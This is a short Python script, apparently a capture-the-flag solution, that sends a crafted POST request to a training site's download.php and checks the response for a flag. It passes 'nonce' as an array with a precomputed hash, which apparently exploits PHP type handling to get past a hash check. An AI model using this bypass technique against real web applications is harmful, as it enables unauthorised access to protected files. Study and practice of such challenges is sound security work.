import requests

data = {
'nonce[]':'lol',
'messid':'lol',
'storagesv':'gimmeflag',
'hash':'028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769'
}

r = requests.post("http://bearshare.training.jinblack.it/download.php", data=data)
print(r.text)
print('flag{' in r.text)